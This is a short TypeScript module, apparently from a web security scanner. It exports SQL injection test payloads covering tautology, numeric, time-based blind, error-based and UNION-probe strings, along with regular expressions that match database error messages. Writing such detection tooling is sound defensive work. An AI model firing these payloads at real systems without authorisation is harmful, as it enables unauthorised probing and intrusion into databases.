/** SQL injection test payloads — non-destructive detection only */
export const SQLI_PAYLOADS = [
  // Classic string-based
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',

  // Numeric-based
  '1 OR 1=1',
  '1 OR 1=1--',
  '1; SELECT 1--',

  // Time-based blind (non-destructive)
  "' OR SLEEP(2)--",
  "1; WAITFOR DELAY '0:0:2'--",

  // Error-based
  "' AND 1=CONVERT(int, @@version)--",
  "' UNION SELECT NULL--",
];

/** SQL error signatures indicating injection vulnerability */
export const SQL_ERROR_PATTERNS = [
  /you have an error in your sql syntax/i,
  /unclosed quotation mark/i,
  /microsoft ole db provider/i,
  /mysql_fetch/i,
  /pg_query/i,
  /sqlite3?\.OperationalError/i,
  /ORA-\d{5}/,
  /quoted string not properly terminated/i,
  /SQL syntax.*?MySQL/i,
  /Warning.*?\Wmysqli?_/i,
  /PostgreSQL.*?ERROR/i,
  /SQLSTATE\[\w+\]/,
  /unterminated string literal/i,
];
